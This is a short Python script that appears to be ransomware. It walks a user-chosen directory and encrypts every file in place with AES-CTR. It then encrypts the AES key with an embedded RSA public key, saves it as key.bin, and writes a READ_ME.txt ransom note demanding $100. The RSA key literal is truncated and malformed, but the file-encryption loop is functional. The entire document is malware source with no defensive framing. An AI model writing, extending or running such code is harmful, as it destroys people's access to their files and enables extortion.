import os
import os.path
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome import Random
from Cryptodome.Util import Counter
from Cryptodome.PublicKey import RSA



# encrypt file with AES MODE_CTR 
key = Random.new().read(16)
def encryptFiles(key, fullpath):
    counter = Counter.new(128)
    c = AES.new(key, AES.MODE_CTR, counter=counter)
    with open(fullpath, 'r+b') as f:
        text = f.read(16)
        while text:
            f.seek(-len(text),1)
            f.write(c.encrypt(text))
            text = f.read(16)


ipath = input("enter the path you want to encrypt it: ")
for dir,subdir, files in os.walk(ipath):
    for file in files:
        fullpath = os.path.join(dir,file)
        encryptFiles(key, fullpath)

# RSA public_key
public_key =  b'-----BEGIN RSA PUBLIC KEY-----\n....' KEY-----'
imported_public_key = RSA.import_key(public_key)
enc = PKCS1_OAEP.new(imported_public_key)
data = key
encrypted_key = enc.encrypt(data)
print(encrypted_key)
with open("key.bin", "wb") as f:
    f.write(encrypted_key)
with open(os.path.join(ipath, "READ_ME.txt"), "w") as note:
    note.write("Your files have been encrypted!\nPay 100$ to unlock.")